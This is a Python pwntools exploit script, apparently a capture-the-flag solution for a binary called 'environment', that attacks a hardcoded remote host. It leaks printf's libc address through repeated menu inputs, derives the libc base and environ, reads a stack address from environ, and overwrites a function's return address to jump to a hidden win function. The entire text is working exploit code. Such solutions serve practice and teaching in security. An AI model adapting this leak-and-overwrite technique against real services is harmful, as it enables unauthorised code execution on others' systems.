from pwn import *

if __name__ == "__main__":
    BIN = ELF("./environment")
    LIBC = ELF("./libc.so.6")
    
    WIN_FUNC = hex(BIN.symbols["hidden_resources"])
    PRINTF = LIBC.symbols["printf"]
    ENVIRON = LIBC.symbols["environ"]
    
    # both values below extracted from test debugging
    # first value is stack location that environ in libc points to
    # second value is the stack location of the return address of sym.plant when called
    STACK_RET = 0x7fff97b6cea8 - 0x7fff97b6cd88

    io = remote("138.68.177.159", 31667)
    #io = remote("localhost", 8001)
    io.recvuntil("> ")

    # recycle enough times to leak printf address in libc
    for _ in range(9):
        io.sendline("2")
        io.recvuntil("> ")
        io.sendline("1")
        io.recvuntil("> ")
        io.sendline("n")
        res = io.recvuntil("> ")

    # extract printf address in libc and use to calculate libc base
    res = res.split(b"gift: \x1b[0m[")[1]
    res = res.split(b"]")[0]
    printf_libc = int(res.decode(), 16)
    libc_base = printf_libc - PRINTF
    environ_libc = libc_base + ENVIRON

    print("libc base: ", hex(libc_base))
    print("environ: ", hex(environ_libc))

    io.sendline("2")
    io.recvuntil("> ")
    io.sendline("2")
    io.recvuntil("> ")
    io.sendline("n")
    io.recvuntil("> ")

    io.sendline(hex(environ_libc))
    res = io.recvuntil("> ")
    res = res.split(b"\n")[0].lstrip(b"\x1b[0m")
    environ_stack = u64(res.ljust(8, b"\x00"))
    plant_stack_ret = hex(environ_stack - STACK_RET)
    

    io.sendline("1")
    io.recvuntil("> ")
    io.sendline(plant_stack_ret)
    io.recvuntil("> ")
    io.sendline(WIN_FUNC)

    io.interactive()
